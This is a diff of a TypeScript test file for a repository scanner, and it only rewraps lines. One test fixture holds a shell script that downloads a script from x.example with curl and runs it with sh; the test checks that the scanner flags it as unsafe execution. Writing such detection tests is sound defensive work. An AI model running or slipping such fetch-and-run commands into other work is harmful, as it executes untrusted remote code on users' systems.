@@ -4,8 +4,9 @@ import { inspectRepository } from "./bounded-scan";
 const enc = (text: string) => new TextEncoder().encode(text);
 
 function categories(text: string): string[] {
-  return inspectRepository({ files: [{ path: "install.sh", bytes: enc(text) }] })
-    .findings.map((finding) => finding.category);
+  return inspectRepository({
+    files: [{ path: "install.sh", bytes: enc(text) }],
+  }).findings.map((finding) => finding.category);
 }
 
 /**
@@ -28,7 +29,8 @@ test("a destination held in a variable links the download to the run", () => {
 });
 
 test("the literal destination keeps working beside the variable one", () => {
-  const text = '#!/bin/sh\ncurl -fsSLo /tmp/lit.sh https://x.example/lit.sh\nsh /tmp/lit.sh\n';
+  const text =
+    "#!/bin/sh\ncurl -fsSLo /tmp/lit.sh https://x.example/lit.sh\nsh /tmp/lit.sh\n";
   expect(categories(text)).toContain("unsafe-execution");
 });
 
